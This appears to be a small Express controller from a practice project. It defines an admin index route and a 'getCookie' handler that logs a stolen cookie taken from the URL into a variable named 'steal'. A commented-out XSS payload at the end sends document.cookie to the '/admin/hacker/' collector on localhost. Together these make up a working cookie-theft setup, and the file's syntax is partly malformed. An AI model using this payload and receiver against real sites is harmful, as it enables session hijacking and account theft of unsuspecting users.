
module.exports = {
    index: (req, res) => {
        res.render('admin/layout', {
            title: 'Admin | Home',
            page: "index",
        })
    }, 

    getCookie: (req, res) => {
        var steal = req.params.cookie;
        console.log(steal)
        
    }
    }
       
{/*  */}
{/* <script>window.location="http://localhost:3000/admin/hacker/"+document.cookie</script> */}
